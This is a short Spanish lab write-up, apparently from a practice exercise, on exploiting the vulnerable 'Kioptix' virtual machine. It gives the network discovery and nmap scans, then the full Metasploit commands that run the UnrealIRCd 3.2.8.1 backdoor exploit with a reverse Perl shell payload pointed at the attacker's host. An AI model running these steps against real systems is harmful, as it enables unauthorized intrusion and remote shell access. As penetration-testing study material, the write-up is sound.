# Cómo he vulnerando la máquina Kioptix 

### Primero hice un reconicimiento de la red en busca de la IP de la máquina virtual (siendo que únicamente conozco la MAC y la red padre):

sudo netdiscover

nmap -sn 10.0.0.0/19

### Obtengo la IP de la máquina a atacar:

10.0.8.37

### Seguidamente hice un nmap -sV en busqueda de puertos abiertos junto al servicio que usa y su versión:
```
ismael@ismael-VirtualBox:~/Escritorio$ nmap -sV 10.0.8.37
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 16:13 CET
Nmap scan report for 10.0.8.37
Host is up (0.00040s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.44 seconds
```
### Analizo con metasploit el servicio de la máquina atacada
```
msfconsole

search UnrealIRC

0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
```

### Ya que la versión de IRC que se está usando "UnrealIRCd" solo tiene una vulnerabilidad conocida, la probaré directamente (exploit/unix/irc/unreal_ircd_3281_backdoor) junto a la payload (payload/cmd/unix/reverse_perl)
#### NOTA: probé también las payloads "reverse" y "reverse_bash_telnet_ssl" pero no funcionarion

```
use 0
show options
set RHOSTS 10.0.8.37
show payloads
set PAYLOAD cmd/unix/reverse_perl
set LHOST 10.0.2.15
show options
run
```
### (La demonstración de que realmente obtuve acceso a la máquina está junto a este fichero)
